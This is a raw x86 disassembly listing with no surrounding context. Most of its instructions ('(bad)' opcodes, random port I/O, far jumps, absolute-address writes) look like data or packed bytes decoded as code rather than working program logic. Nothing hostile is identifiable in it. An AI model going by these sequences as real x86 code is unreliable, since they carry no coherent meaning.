  405a3c:	jmp    0x165ad185
  405a41:	in     al,0xb3
  405a43:	fsub   QWORD PTR [eax]
  405a45:	dec    esp
  405a46:	rcr    DWORD PTR [ebp-0x21],0x49
  405a4a:	jae    0x405a31
  405a4c:	push   ebp
  405a4d:	fisubr WORD PTR [ebx]
  405a4f:	xchg   ebx,eax
  405a50:	js     0x405a3c
  405a52:	xchg   eax,esp
  405a54:	in     al,0x9c
  405a56:	addr16 hlt 
  405a58:	pop    ebp
  405a59:	inc    esi
  405a5a:	bswap  ebx
  405a5c:	push   eax
  405a5d:	mov    ds:0xe8d22ef0,al
  405a62:	loopne 0x405a96
  405a64:	sub    bl,BYTE PTR [esi]
  405a66:	out    dx,al
  405a67:	mov    ds:0x5deaf8bf,eax
  405a6c:	mov    ds:0x6f08727a,eax
  405a71:	sbb    edi,DWORD PTR ds:[edx+0x2ad088cb]
  405a78:	pushf  
  405a79:	xor    eax,0x73f7c762
  405a7e:	mov    esp,0x84d05d1d
  405a83:	retf   
  405a84:	mov    ch,0x24
  405a86:	fst    st(0)
  405a88:	push   0x4a94356c
  405a8d:	nop
  405a8e:	xor    esi,DWORD PTR [ebx+ebx*2+0x46]
  405a92:	jl     0x405a21
  405a94:	push   0xd7c3f48
  405a99:	inc    esp
  405a9a:	hlt    
  405a9b:	repnz retf 
  405a9d:	retf   
  405a9e:	stos   BYTE PTR es:[edi],al
  405a9f:	pop    ss
  405aa0:	mov    cl,0xdd
  405aa2:	jg     0x405aa4
  405aa4:	xchg   ecx,eax
  405aa5:	leave  
  405aa6:	pop    ecx
  405aa7:	push   es
  405aa8:	jp     0x405aec
  405aaa:	ret    0x67c6
  405aad:	test   DWORD PTR ss:[edx+0x3d],esi
  405ab1:	(bad)
  405ab4:	stos   BYTE PTR es:[edi],al
  405ab5:	push   esp
  405ab6:	add    dl,dh
  405ab8:	test   al,0x60
  405aba:	std    
  405abb:	pop    es
  405abc:	stos   DWORD PTR es:[edi],eax
  405abd:	jae    0x405ab9
  405abf:	cmp    DWORD PTR [eax],ebp
  405ac1:	push   esp
  405ac2:	ret    0x8a22
  405ac5:	xor    esp,DWORD PTR [edx+0x5f]
  405ac8:	xchg   esp,eax
  405ac9:	adc    ch,BYTE PTR [edi-0x3a7ad363]
  405acf:	mov    edi,DWORD PTR ds:0xe382e7fe
  405ad5:	xor    BYTE PTR [edx],dl
  405ad7:	add    ebp,edi
  405ad9:	mov    ds:0xacb0f925,eax
  405ade:	les    ebx,FWORD PTR [esi+edi*1]
  405ae1:	in     al,dx
  405ae2:	xchg   edx,eax
  405ae3:	icebp  
  405ae4:	xor    BYTE PTR [edi-0xed26c14],al
  405aea:	add    BYTE PTR [esi+0x72ba6e6b],0x7
  405af1:	mov    ecx,0xa1508975
  405af6:	lahf   
  405af7:	pop    es
  405af8:	loopne 0x405ab8
  405afa:	popa   
  405afb:	mov    bh,0x39
  405afd:	addr16 bound esp,QWORD PTR [bx+0x914]
  405b03:	icebp  
  405b04:	mov    bl,0x23
  405b06:	out    dx,eax
  405b07:	mov    eax,ds:0xbd9f2235
  405b0c:	adc    esi,ebp
  405b0e:	retf   0xa44e
  405b11:	je     0x405b87
  405b13:	sbb    ecx,0x20a90af6
  405b19:	out    0xd7,eax
  405b1b:	scas   al,BYTE PTR es:[edi]
  405b1c:	(bad)  
  405b1d:	push   edi
  405b1e:	dec    ebx
  405b1f:	scas   eax,DWORD PTR es:[edi]
  405b20:	mov    eax,0x1815576f
  405b25:	or     eax,0x48642397
  405b2a:	fyl2x  
  405b2c:	stos   BYTE PTR es:[edi],al
  405b2d:	pop    esp
  405b2e:	jl     0x405bad
  405b30:	in     eax,0xdd
  405b32:	dec    eax
  405b33:	stos   BYTE PTR es:[edi],al
  405b34:	out    dx,eax
  405b35:	out    dx,eax
  405b36:	fisttp WORD PTR [ebp-0x20d2d295]
  405b3c:	bound  ebp,QWORD PTR ds:0xbb35f3d2
  405b42:	or     BYTE PTR [ebx],al
  405b44:	enter  0x2172,0x62
  405b48:	mov    esp,0xa6b2afcb
  405b4d:	jnp    0x405b0a
  405b4f:	mov    ?,WORD PTR [ecx+ebx*8+0x4c]
  405b53:	retf   
  405b54:	lds    ebp,FWORD PTR [esp+edi*1-0x26]
  405b58:	xchg   DWORD PTR [edx],edi
  405b5a:	loopne 0x405b80
  405b5c:	mov    esi,0x61f5abc0
  405b61:	mov    esi,0xce70010d
  405b66:	mov    ebx,0xbc8ad184
  405b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b6c:	push   0x1
  405b6e:	leave  
  405b6f:	jno    0x405b21
  405b71:	xchg   BYTE PTR [ebp+0x480e0ae],bh
  405b77:	mov    ebx,0x92adde1e
  405b7c:	loop   0x405b8b
  405b7e:	dec    edx
  405b7f:	shl    BYTE PTR [ebx+0x7e41ba0e],0xaa
  405b86:	(bad)  
  405b87:	jae    0x405ba2
  405b89:	or     DWORD PTR [ebx],edx
  405b8b:	pusha  
  405b8c:	cmp    dl,bl
  405b8e:	daa    
  405b8f:	pushf  
  405b90:	outs   dx,DWORD PTR ds:[esi]
  405b91:	push   eax
  405b92:	mov    cl,0x66
  405b94:	pop    edi
  405b95:	sbb    BYTE PTR [edi-0x67],ah
  405b98:	xchg   BYTE PTR [edx+0x1a],cl
  405b9b:	or     al,0xaa
  405b9d:	ds pop edx
  405b9f:	push   0x74
  405ba1:	sub    DWORD PTR [ebp+0x13],0x7
  405ba5:	push   edx
  405ba6:	jle    0x405b4a
  405ba8:	or     al,0xc1
  405baa:	mov    edi,0xe8f0b2e0
  405baf:	std    
  405bb0:	mov    ebx,0x320c2048
  405bb5:	push   es
  405bb6:	xchg   DWORD PTR [edx],esi
  405bb8:	jl     0x405c2b
  405bba:	pop    edx
  405bbb:	mov    eax,0xbaac5d14
  405bc0:	scas   eax,DWORD PTR es:[edi]
  405bc1:	popa   
  405bc2:	pop    esi
  405bc3:	and    bl,cl
  405bc5:	retf   
  405bc6:	mov    edx,0x26c0ccc8
  405bcb:	mov    ds:0xfe45586a,eax
  405bd0:	je     0x405b9b
  405bd2:	icebp  
  405bd3:	(bad)  
  405bd5:	jmp    0xb84f:0x1b1b2423
  405bdc:	addr16 enter 0xa66e,0x8a
  405be1:	fbld   TBYTE PTR [esi-0x77]
  405be4:	in     eax,dx
  405be5:	dec    ebx
  405be6:	xor    al,0x41
  405be8:	loop   0x405b9b
  405bea:	mov    ebx,0xc426016
  405bef:	add    al,0x42
  405bf1:	xor    ebp,ecx
  405bf3:	imul   ebp,DWORD PTR [edi+0x68],0x1
  405bf7:	push   0xa69eb74f
  405bfc:	xchg   esi,eax
  405bfd:	(bad)  [ebp-0x7f14e4aa]
  405c03:	pop    ebp
  405c04:	loopne 0x405c15
  405c06:	or     bh,BYTE PTR [ebx+0x97523e8]
  405c0c:	aas    
  405c0d:	or     ebp,ebx
  405c0f:	into   
  405c10:	bound  eax,QWORD PTR [edi]
  405c12:	jns    0x405c5c
  405c14:	cwde   
  405c15:	cld    
  405c16:	cs (bad) 
  405c18:	fnstcw WORD PTR [ebp-0x6dd90bc1]
  405c1e:	mov    bl,ah
  405c20:	push   ebp
  405c21:	cmp    ebx,DWORD PTR [edi]
  405c23:	mov    BYTE PTR [edi],bh
  405c25:	repnz adc al,0x7c
  405c28:	lods   al,BYTE PTR ds:[esi]
  405c29:	dec    edx
  405c2a:	inc    ecx
  405c2b:	int3   
  405c2c:	cmp    al,0x27
  405c2e:	gs es out 0xd8,eax
  405c32:	lds    ecx,FWORD PTR [edx+ecx*4-0x64]
  405c36:	push   ecx
  405c37:	test   DWORD PTR [eax+0x10],eax
  405c3a:	shr    DWORD PTR [ebx],0x4d
  405c3d:	scas   al,BYTE PTR es:[edi]
  405c3e:	push   edx
  405c3f:	mov    dl,0x69
  405c41:	cmp    esp,DWORD PTR [edi+0x68]
  405c44:	(bad)  
  405c45:	mov    al,0x43
  405c47:	arpl   sp,sp
  405c49:	mov    DWORD PTR [edx+eax*8],ebx
  405c4c:	dec    edi
  405c4d:	mov    ah,0x91
  405c4f:	lods   eax,DWORD PTR ds:[esi]
  405c50:	xchg   BYTE PTR [ecx+0x3ca323ee],ah
  405c56:	cmc    
  405c57:	scas   eax,DWORD PTR es:[edi]
  405c58:	inc    esp
  405c59:	(bad)  
  405c5a:	clc    
  405c5b:	mov    ecx,0x5e2034f5
  405c60:	pop    ss
  405c61:	int    0x12
  405c63:	sub    al,0xa0
  405c65:	or     al,BYTE PTR [ecx+edx*8]
  405c68:	push   ss
  405c69:	or     BYTE PTR [ebx+0x63],al
  405c6c:	out    0xe1,eax
  405c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c6f:	push   ebp
  405c70:	bound  ecx,QWORD PTR [ebx+0x752517b6]
  405c76:	shl    BYTE PTR ds:0x365ba207,0xc
  405c7d:	sbb    eax,0xaced0310
  405c82:	jg     0x405c23
  405c84:	outs   dx,BYTE PTR ds:[esi]
  405c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c86:	xchg   BYTE PTR [ebp+0x3554addb],bl
  405c8c:	sub    DWORD PTR [ecx+edi*8],0xffffff91
  405c90:	ins    DWORD PTR es:[edi],dx
  405c91:	mov    edx,0x85563193
  405c96:	jge    0x405c73
  405c98:	aaa    
  405c99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c9a:	inc    ebx
  405c9b:	jmp    0x3865:0x9a48fc16
  405ca2:	pop    ecx
  405ca3:	and    BYTE PTR [ebx-0x5fbb9265],bl
  405ca9:	shl    ecx,cl
  405cab:	mul    BYTE PTR [edi-0x2813f62d]
  405cb1:	or     al,0x13
  405cb3:	or     edi,DWORD PTR [edx-0x4db32175]
  405cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cba:	fwait
  405cbb:	mov    ebx,0x86545a31
  405cc0:	sub    eax,0xe8a9d4ba
  405cc5:	or     bh,ch
  405cc7:	xor    DWORD PTR cs:[edi-0x75],0x77
  405ccc:	ficomp DWORD PTR [ebx]
  405cce:	pusha  
  405ccf:	mov    ebp,0x81139bd4
  405cd4:	(bad)  
  405cd5:	sbb    al,cl
  405cd7:	les    ecx,FWORD PTR [edi+edx*4+0x16]
  405cdb:	or     eax,0xfe7d4aa1
  405ce0:	sbb    esi,DWORD PTR [eax-0x3e]
  405ce3:	mov    ecx,0xc14356d
  405ce8:	mov    bl,0x61
  405cea:	jnp    0x405d01
  405cec:	into   
  405ced:	or     BYTE PTR [ebx],dl
  405cef:	lahf   
  405cf0:	and    edi,DWORD PTR [edx]
  405cf2:	pop    edx
  405cf3:	out    dx,al
  405cf4:	aaa    
  405cf5:	sbb    esp,DWORD PTR [ecx+0x6c]
  405cf8:	jno    0x405ca3
  405cfa:	dec    esp
  405cfb:	jnp    0x405cf6
  405cfd:	add    DWORD PTR [ecx+eiz*2+0x169bd2bb],esp
  405d04:	add    DWORD PTR [edi*4+0x498e33bc],0x7
  405d0c:	jae    0x405d11
  405d0e:	mov    eax,DWORD PTR [esi]
  405d10:	mov    esp,0xad22510a
  405d15:	aam    0xef
  405d17:	mov    esp,0xe4d5bb13
  405d1c:	xchg   esp,eax
  405d1d:	popf   
  405d1e:	ins    DWORD PTR es:[edi],dx
  405d1f:	in     al,0xa1
  405d21:	mov    dh,0x8d
  405d23:	mov    dl,0xc0
  405d25:	js     0x405d6c
  405d27:	add    bl,dl
  405d29:	test   DWORD PTR [ebx+ebx*4-0x80],esi
  405d2d:	xor    ch,ah
  405d2f:	and    ebx,esi
  405d31:	fldcw  WORD PTR [eax]
  405d33:	lods   al,BYTE PTR ds:[esi]
  405d34:	inc    edi
  405d35:	iret   
  405d36:	lea    esi,[eax+0x49]
  405d39:	mov    al,ds:0x94fc3960
  405d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d3f:	pushf  
  405d40:	outs   dx,DWORD PTR ds:[esi]
  405d41:	not    DWORD PTR [ebp-0x49]
  405d44:	inc    edx
  405d45:	pop    ss
  405d46:	xchg   DWORD PTR [esi],edx
  405d48:	adc    eax,0x81313e44
  405d4d:	sti    
  405d4e:	mov    ah,0xd3
  405d50:	clc    
  405d51:	je     0x405cff
  405d53:	test   eax,0x99d37b4f
  405d58:	(bad)  
  405d59:	(bad)  
  405d5a:	sbb    BYTE PTR [eax+0x700ad9a7],al
  405d60:	push   ecx
  405d61:	pop    ecx
  405d62:	xchg   ebp,eax
  405d63:	sar    al,1
  405d65:	adc    ebp,edx
  405d67:	jae    0x405d85
  405d69:	inc    ebp
  405d6a:	sbb    eax,0x4d03b468
  405d6f:	jae    0x405db6
  405d71:	inc    edi
  405d72:	cmp    al,0x58
  405d74:	fistp  WORD PTR [ebp+0x6e]
  405d77:	jmp    0x913333ba
  405d7c:	mov    esi,eax
  405d7e:	shl    dl,1
  405d80:	jge    0x405d2d
  405d82:	sub    BYTE PTR [ebp+0x3],al
  405d85:	scas   al,BYTE PTR es:[edi]
  405d86:	pop    edx
  405d87:	or     eax,0x46282fb5
  405d8c:	push   ebp
  405d8d:	nop
  405d8e:	gs adc eax,0xae46b7f
  405d94:	adc    DWORD PTR [esi+0x7a],esi
  405d97:	and    DWORD PTR [edi],0xffffffec
  405d9a:	pop    esp
  405d9b:	add    ecx,DWORD PTR [edx-0x16]
  405d9e:	sub    BYTE PTR [edi],dl
  405da0:	dec    ecx
  405da1:	or     eax,0xf1fa6d6e
  405da6:	push   edx
  405da7:	mov    ebp,0xad5d6129
  405dac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dad:	xor    al,0xc5
  405daf:	xor    DWORD PTR [edi+0x7b],eax
  405db2:	xor    al,0x24
  405db4:	jmp    DWORD PTR [eax+eiz*2-0x444b3d1c]
  405dbb:	adc    BYTE PTR [ebp-0x3c],0x5e
  405dbf:	ins    DWORD PTR es:[edi],dx
  405dc0:	mov    cl,0xf8
  405dc2:	aaa    
  405dc3:	xchg   ebx,eax
  405dc4:	jno    0x405d4d
  405dc6:	jb     0x405d55
  405dc8:	add    ebp,DWORD PTR [bp+0x19]
  405dcc:	(bad)  
  405dcd:	pop    edi
  405dce:	imul   edi,DWORD PTR [edx-0x6d],0xfffffff0
  405dd2:	push   ds
  405dd3:	test   DWORD PTR [edi+0x4b],0xe0ef3930
  405dda:	imul   esi,DWORD PTR [edx-0x5cbda702],0x2d
  405de1:	push   cs
  405de2:	sbb    eax,esp
  405de4:	popw   ss
  405de6:	and    DWORD PTR [edx-0x268e5e9d],esi
  405dec:	and    edi,ecx
  405dee:	sbb    ebp,esi
  405df0:	xchg   eax,esi
  405df2:	sti    
  405df3:	cmp    BYTE PTR [eax],ah
  405df5:	and    al,0xa3
  405df7:	daa    
  405df8:	dec    eax
  405df9:	sar    DWORD PTR [esi+0x339ebe9e],1
  405dff:	xchg   edi,eax
  405e00:	outs   dx,DWORD PTR ds:[esi]
  405e01:	scas   al,BYTE PTR es:[edi]
  405e02:	ret    
  405e03:	mov    DWORD PTR [esi],esp
  405e05:	add    eax,DWORD PTR ds:0xf4eabed9
  405e0b:	sub    DWORD PTR [edx-0x4c],0x2738ac86
  405e12:	jae    0x405e0a
  405e14:	fisubr DWORD PTR ds:0x8660aec8
  405e1a:	or     DWORD PTR ds:0x730a9a3e,ebp
  405e20:	stc    
  405e21:	jp     0x405daa
  405e23:	xor    BYTE PTR [edx-0x28],ch
  405e26:	pop    eax
  405e27:	xchg   esp,eax
  405e28:	fwait
  405e29:	jmp    0x405e73
  405e2b:	leave  
  405e2c:	ret    
  405e2d:	ins    DWORD PTR es:[edi],dx
  405e2e:	xchg   edi,eax
  405e2f:	es push ss
  405e31:	lahf   
  405e32:	cmp    ebx,DWORD PTR [edi-0x71]
  405e35:	pop    esi
  405e36:	adc    eax,ecx
  405e38:	inc    ebp
  405e39:	jecxz  0x405dda
  405e3b:	push   ds
  405e3c:	sbb    eax,0x33682c27
  405e41:	mov    BYTE PTR [edi-0x3e],ch
  405e44:	mov    dh,0xed
  405e46:	mov    ds:0x4ba180ec,eax
  405e4b:	adc    ebx,edi
  405e4d:	mov    ds,ebp
  405e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e50:	push   esp
  405e51:	test   ah,0x45
  405e54:	push   esi
  405e55:	xchg   esi,eax
  405e56:	test   DWORD PTR [ecx-0x46db738d],eax
  405e5c:	shr    bl,0x31
  405e5f:	pop    edi
  405e60:	push   esp
  405e61:	mov    al,cs:0x6981beac
  405e67:	push   0xffffff89
  405e69:	ds and eax,0x7470443a
  405e6f:	mov    al,0x7d
  405e71:	dec    eax
  405e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e73:	cli    
  405e74:	pushf  
  405e75:	and    al,bh
  405e77:	in     eax,dx
  405e78:	push   ebp
  405e79:	sbb    BYTE PTR [ebp-0x268938b3],ah
  405e7f:	pop    esi
  405e80:	fwait
  405e81:	add    DWORD PTR [ecx+0x55],eax
  405e84:	repz jo 0x405ed5
  405e87:	ins    DWORD PTR es:[edi],dx
  405e88:	mov    dl,0x7
  405e8a:	addr16 out dx,al
  405e8c:	fmul   DWORD PTR [ebx-0x5dddac3b]
  405e92:	xor    ebx,DWORD PTR [ecx-0x12]
  405e95:	test   BYTE PTR [esi+0x1b],al
  405e98:	mov    ds:0x824a9c37,al
  405e9d:	test   eax,0xad46cb31
  405ea3:	popf   
  405ea4:	xor    DWORD PTR [esi-0x151aef5d],eax
  405eaa:	add    al,0x37
  405eac:	sub    ecx,0xffffffaf
  405eaf:	mov    ch,0x20
  405eb1:	mov    bl,0x43
  405eb3:	xchg   edx,eax
  405eb4:	lahf   
  405eb5:	ins    BYTE PTR es:[edi],dx
  405eb6:	pop    ebx
  405eb7:	dec    ecx
  405eb8:	mov    ch,0x65
  405eba:	aas    
  405ebb:	pop    eax
  405ebc:	mov    bl,0x9c
  405ebe:	mov    ds:0x58f2f694,eax
  405ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ec4:	test   DWORD PTR [ebp-0x3b],edx
  405ec7:	jge    0x405f2f
  405ec9:	push   cs
  405eca:	xchg   edx,eax
  405ecb:	ja     0x405f34
  405ecd:	arpl   si,di
  405ecf:	cmp    ebx,eax
  405ed1:	rcl    DWORD PTR [ecx-0x181b1c92],0x55
  405ed8:	mov    edx,0xb5d5481c
  405edd:	mov    dh,0xb2
  405edf:	rcl    dl,cl
  405ee1:	dec    edx
  405ee2:	sbb    BYTE PTR [ebp-0x4470a54d],al
  405ee8:	inc    esp
  405ee9:	sub    eax,0x79b97e5f
  405eee:	or     ch,BYTE PTR [ecx+0x13]
  405ef1:	les    esi,FWORD PTR [ebp+0x46]
  405ef4:	sbb    DWORD PTR [edi+0x63],esi
  405ef7:	sbb    eax,0x4d404297
  405efc:	dec    ecx
  405efd:	push   edi
  405efe:	push   ds
  405eff:	inc    ebx
  405f00:	push   es
  405f01:	or     BYTE PTR [ebx+0x66],dl
  405f04:	add    dh,cl
  405f06:	pop    ebp
  405f07:	cmp    BYTE PTR [esi],ch
  405f09:	outs   dx,BYTE PTR gs:[esi]
  405f0b:	or     edx,ebp
  405f0d:	aaa    
  405f0e:	adc    eax,0x4e74a482
  405f13:	jnp    0x405f15
  405f15:	mov    edi,0xd199294e
  405f1a:	dec    ecx
  405f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f1c:	push   esi
  405f1d:	fdivrp st(0),st
  405f1f:	out    0x77,al
  405f21:	mov    dh,0xce
  405f23:	pop    ecx
  405f24:	stos   DWORD PTR es:[edi],eax
  405f25:	dec    eax
  405f26:	lea    esp,[esi+0x7a]
  405f29:	fwait
  405f2a:	popa   
  405f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f2c:	and    ebx,0x76
  405f2f:	das    
  405f30:	mov    ds:0xd63c431c,al
  405f35:	jno    0x405f58
  405f37:	inc    ebp
  405f38:	cmp    dh,BYTE PTR [esp+eax*4-0xf]
  405f3c:	aaa    
  405f3d:	xor    BYTE PTR [edx+edx*1],dh
  405f40:	mov    ebp,0x19e8c5e9
  405f45:	inc    ebp
  405f46:	leave  
  405f47:	sbb    al,0x34
  405f49:	inc    esi
  405f4a:	push   esp
  405f4b:	enter  0x9da8,0x8
  405f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f50:	jb     0x405f06
  405f52:	push   ebp
  405f53:	cdq    
  405f54:	xchg   DWORD PTR [esi+0x43],ebp
  405f57:	xchg   BYTE PTR [edx-0x11],dh
  405f5a:	add    al,0x7c
  405f5c:	push   ss
  405f5d:	jo     0x405fda
  405f5f:	out    dx,al
  405f60:	xchg   ebp,eax
  405f61:	call   0x83651d0e
  405f66:	mov    edi,0x8112c8ce
  405f6b:	sub    edi,DWORD PTR [edi-0x52]
  405f6e:	xchg   ebp,eax
  405f6f:	mov    bl,0xa7
  405f71:	xchg   esi,eax
  405f72:	mov    ?,WORD PTR [ebx-0x1c]
  405f75:	xchg   ebx,eax
  405f76:	xor    ah,BYTE PTR [edx+0x24]
  405f79:	push   es
  405f7a:	mov    ds:0x596ef303,eax
  405f7f:	int3   
  405f80:	or     bl,cl
  405f82:	(bad)  
  405f83:	pop    DWORD PTR [ecx+0x59]
  405f86:	inc    edi
  405f87:	cmp    al,0xa5
  405f89:	mov    edx,DWORD PTR [esi]
  405f8b:	jecxz  0x405fe7
  405f8d:	or     DWORD PTR ds:0x9cdd8132,esp
  405f93:	sbb    al,0x68
  405f95:	sbb    bh,BYTE PTR [edx+0xa08d8e1]
  405f9b:	or     al,0x1a
  405f9d:	data16 fild QWORD PTR [ecx]
  405fa0:	aaa    
  405fa1:	test   edx,ebx
  405fa3:	ins    DWORD PTR es:[edi],dx
  405fa4:	add    bl,BYTE PTR [ebp+0x613e7e0]
  405faa:	popf   
  405fab:	mov    eax,ds:0x571fe1f1
  405fb0:	mov    ds:0x2c2a04eb,al
  405fb5:	push   0x121bf5f9
  405fba:	and    eax,0x77336421
  405fbf:	mov    dl,0x36
  405fc1:	jmp    0x405f92
  405fc3:	dec    ebp
  405fc4:	(bad)  
  405fc5:	int    0x55
  405fc7:	nop
  405fc8:	xchg   ebx,eax
  405fc9:	xchg   edi,eax
  405fca:	fs ja  0x40602d
  405fcd:	pop    es
  405fce:	hlt    
  405fcf:	mov    al,BYTE PTR [edi]
  405fd1:	aad    0x9f
  405fd3:	jmp    0x489a4f85
  405fd8:	and    al,bl
  405fda:	mov    esp,DWORD PTR [esi]
  405fdc:	ds (bad) 
  405fde:	mov    ds:0xaafc10fe,al
  405fe3:	cli    
  405fe4:	sub    eax,0xffffffe9
  405fe7:	sbb    eax,0x32f0784b
  405fec:	enter  0xac97,0xa0
  405ff0:	iret   
  405ff1:	fwait
  405ff2:	sub    al,0xd6
  405ff4:	push   esp
  405ff5:	(bad)  
  405ff8:	inc    ebx
  405ff9:	cdq    
  405ffa:	out    0x1d,al
  405ffc:	dec    esi
  405ffd:	xchg   esp,eax
  405ffe:	push   edx
  405fff:	mov    edx,0x12601a97
  406004:	dec    edx
  406005:	jmp    0x405fdb
  406007:	retf   
  406008:	add    BYTE PTR [eax],ah
  40600a:	dec    edx
  40600b:	xor    ebx,DWORD PTR [eax-0x57]
  40600e:	inc    esi
  40600f:	pop    esp
  406010:	sbb    al,BYTE PTR [esi]
  406012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406013:	cwde   
  406014:	adc    BYTE PTR [esi+0x14],al
  406017:	shl    DWORD PTR [ecx],0xd6
  40601a:	aaa    
  40601b:	xor    BYTE PTR [esi+edx*2-0x36],dh
  40601f:	dec    eax
  406020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406021:	in     eax,0xec
  406023:	lods   al,BYTE PTR es:[esi]
  406025:	das    
  406026:	std    
  406027:	sub    edi,DWORD PTR [esi]
  406029:	out    dx,al
  40602a:	mov    ds:0x5fe141d0,al
  40602f:	dec    ebx
  406030:	data16 js 0x405ffb
  406033:	adc    edi,DWORD PTR [eax]
  406035:	pop    ss
  406036:	cld    
  406037:	fnstcw WORD PTR [edx+0x6c901bbf]
  40603d:	mov    WORD PTR [edi],?
  40603f:	mov    es,ebp
  406041:	ss gs data16 jo 0x4060c0
  406046:	mov    esp,0x6ab2bda
  40604b:	retf   
  40604c:	ss xchg edx,eax
  40604e:	push   0xffffffce
  406050:	jge    0x406025
  406052:	pop    eax
  406053:	jns    0x405ffa
  406055:	mov    esi,0x7fb75f39
  40605a:	and    DWORD PTR [esi+0x7e283b8c],ebp
  406060:	lods   al,BYTE PTR ds:[esi]
  406061:	cld    
  406062:	pop    esi
  406063:	jbe    0x405ff8
  406065:	mov    esp,0xb1311391
  40606a:	pushf  
  40606b:	or     al,0xa1
  40606d:	mul    edx
  40606f:	pushf  
  406070:	fistp  QWORD PTR [esi+0x5addfbad]
  406076:	test   eax,0x8dd420d9
  40607b:	and    edx,DWORD PTR [edi+0x54]
  40607e:	arpl   WORD PTR [edi+eiz*2-0x4d],di
  406082:	mov    ah,0xc2
  406084:	js     0x406073
  406086:	dec    ebx
  406087:	ds push edi
  406089:	std    
  40608a:	mov    WORD PTR [ebx],?
  40608c:	imul   BYTE PTR [ebp-0x299f4c79]
  406092:	push   0xffdd19e6
  406097:	jne    0x4060ff
  406099:	test   eax,0x76f2903d
  40609e:	push   eax
  40609f:	mov    al,0x15
  4060a1:	aam    0x82
  4060a3:	dec    ecx
  4060a4:	mov    ebp,0xe36c89c0
  4060a9:	inc    ecx
  4060aa:	(bad)  
  4060ab:	push   ebx
  4060ac:	clc    
  4060ad:	or     al,0xcf
  4060af:	iret   
  4060b0:	mov    esi,0xafc0e7f9
  4060b5:	jp     0x4060b7
  4060b7:	adc    BYTE PTR ds:0x59004342,dl
  4060bd:	dec    edi
  4060be:	mov    DWORD PTR [edx+0x53ef2b3d],esi
  4060c4:	scas   eax,DWORD PTR es:[edi]
  4060c5:	int3   
  4060c6:	mov    ss,WORD PTR [ebx]
  4060c8:	mov    edx,DWORD PTR [eax+0x75]
  4060cb:	ja     0x406103
  4060cd:	add    bh,BYTE PTR [ecx-0x14]
  4060d0:	leave  
  4060d1:	(bad)  
  4060d2:	fistp  QWORD PTR [esi-0x12]
  4060d5:	jb     0x4060b4
  4060d7:	and    bh,BYTE PTR [ebx]
  4060d9:	push   ecx
  4060da:	out    dx,eax
  4060db:	jae    0x406126
  4060dd:	adc    al,BYTE PTR [ebx-0x35]
  4060e0:	data16 je 0x406118
  4060e3:	stos   BYTE PTR es:[edi],al
  4060e4:	ror    BYTE PTR [edi+0x59aa426],cl
  4060ea:	mov    ecx,0x8bc84ddc
  4060ef:	fnstenv [ebp+0x2ffa0347]
  4060f5:	dec    edx
  4060f6:	test   DWORD PTR [esi],esi
  4060f8:	test   al,0xa8
  4060fa:	sbb    ebp,edx
  4060fc:	test   ebp,ebx
  4060fe:	(bad)  
  4060ff:	jbe    0x406176
  406101:	jle    0x40615a
  406103:	jne    0x406086
  406105:	call   0x31c:0x6c08f356
  40610c:	out    dx,al
  40610d:	mov    ds:0xc9ea5c45,eax
  406112:	nop
  406113:	xchg   ebx,esi
  406115:	sbb    al,0x54
  406117:	fist   DWORD PTR [edi+esi*1]
  40611a:	jmp    0x406186
  40611c:	mov    esi,0xae2dc3c2
  406121:	xchg   edi,eax
  406122:	sar    DWORD PTR [eax],cl
  406124:	adc    al,0x61
  406126:	pop    edi
  406127:	sahf   
  406128:	mov    edi,0xe58a3b46
  40612d:	inc    esi
  40612e:	inc    ebp
  40612f:	mov    bl,0x6f
  406131:	repnz mov DWORD PTR [esi-0x6d],edx
  406135:	sbb    BYTE PTR [esi],ch
  406137:	repz dec ebp
  406139:	dec    edx
  40613a:	xchg   ecx,eax
  40613b:	data16 cld 
  40613d:	sub    DWORD PTR ds:0xbf7de805,eax
  406143:	or     DWORD PTR [edx+0x8],ebx
  406146:	rcr    BYTE PTR [ecx-0x2c573225],0x8e
  40614d:	push   0x43
  40614f:	dec    ebp
  406150:	dec    eax
  406151:	ins    DWORD PTR es:[edi],dx
  406152:	mov    esi,esi
  406154:	push   edi
  406155:	pop    ecx
  406156:	or     eax,0x63671d17
  40615b:	iret   
  40615c:	(bad)  
  40615d:	out    0x2,al
  40615f:	in     al,dx
  406160:	xchg   ebx,eax
  406161:	dec    ecx
  406162:	shl    esi,cl
  406164:	out    dx,al
  406165:	pop    eax
  406166:	jb     0x40616b
  406168:	test   eax,0xb588799f
  40616d:	int    0x80
  40616f:	mov    WORD PTR [edx+ebx*1+0x450239d9],sp
  406177:	lds    ebx,FWORD PTR [edi]
  406179:	push   ebx
  40617a:	es sti 
  40617c:	sbb    BYTE PTR [ecx],bh
  40617e:	and    cl,BYTE PTR [ecx-0x1dfb2583]
  406184:	mov    esi,0x569fdeb2
  406189:	jns    0x406137
  40618b:	aad    0xeb
  40618d:	call   0x2b0c35a5
  406192:	add    esi,DWORD PTR [esp+edi*4-0x2c]
  406196:	fldcw  WORD PTR [edx-0x60]
  406199:	cmp    ebx,DWORD PTR [eax+0x3eb236a]
  40619f:	rcr    DWORD PTR [esi-0x14ca67a1],0x75
  4061a6:	lahf   
  4061a7:	jbe    0x40616c
  4061a9:	js     0x40615c
  4061ab:	or     eax,0xc1c1bc0b
  4061b0:	xchg   esi,eax
  4061b1:	mov    ds:0x71f340d0,eax
  4061b6:	push   ds
  4061b7:	pop    ecx
  4061b8:	mov    BYTE PTR [ecx+ebx*1+0x3272f6],al
  4061bf:	mov    eax,DWORD PTR [ebp+0xc]
  4061c2:	xor    eax,esi
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
